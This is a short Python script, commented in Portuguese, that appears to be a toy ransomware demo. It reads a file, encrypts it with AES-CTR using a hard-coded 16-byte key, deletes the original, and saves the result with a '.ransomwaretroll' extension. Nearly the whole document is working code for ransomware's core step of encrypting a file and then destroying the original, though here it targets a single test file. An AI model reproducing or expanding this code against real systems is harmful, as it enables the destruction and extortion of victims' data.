import os
import pyaes

def encrypt_file(file_name, key):
    """
    Função para criptografar um arquivo.
    :param file_name: Nome do arquivo a ser criptografado.
    :param key: Chave de criptografia (16 bytes).
    """
    if not os.path.exists(file_name):
        print(f"Erro: Arquivo '{file_name}' não encontrado.")
        return

    try:
        # Abrir o arquivo a ser criptografado
        with open(file_name, "rb") as file:
            file_data = file.read()

        # Inicializar o AES para criptografia
        aes = pyaes.AESModeOfOperationCTR(key)
        crypto_data = aes.encrypt(file_data)

        # Remover o arquivo original
        os.remove(file_name)

        # Salvar o arquivo criptografado
        encrypted_file_name = file_name + ".ransomwaretroll"
        with open(encrypted_file_name, "wb") as new_file:
            new_file.write(crypto_data)

        print(f"Arquivo criptografado com sucesso: {encrypted_file_name}")

    except Exception as e:
        print(f"Erro ao criptografar o arquivo: {e}")

# Configuração de execução
if __name__ == "__main__":
    file_name = "teste.txt"  # Nome do arquivo a ser criptografado
    key = b"testeransomwares"  # Chave de criptografia (16 bytes)
    encrypt_file(file_name, key)
